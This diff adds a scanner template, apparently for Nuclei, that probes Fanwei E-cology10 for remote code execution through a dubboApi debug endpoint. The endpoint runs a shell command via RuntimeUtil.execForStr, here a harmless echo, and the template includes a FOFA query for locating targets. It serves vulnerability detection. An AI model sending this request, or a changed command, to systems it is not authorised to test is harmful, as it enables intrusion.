@@ -1,0 +1,25 @@
+id: fanwei-E-cology10-interfaceName-rce
+info:
+  name: fanwei-E-cology10-interfaceName-rce
+  author: lemonlove7
+  severity: critical
+  metadata:
+    fofa-query: icon_hash="-1619753057"
+http:
+  - raw:
+      - |-
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+        
+        [["echo 123456789"]]
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 123456789
+    matchers-condition: and
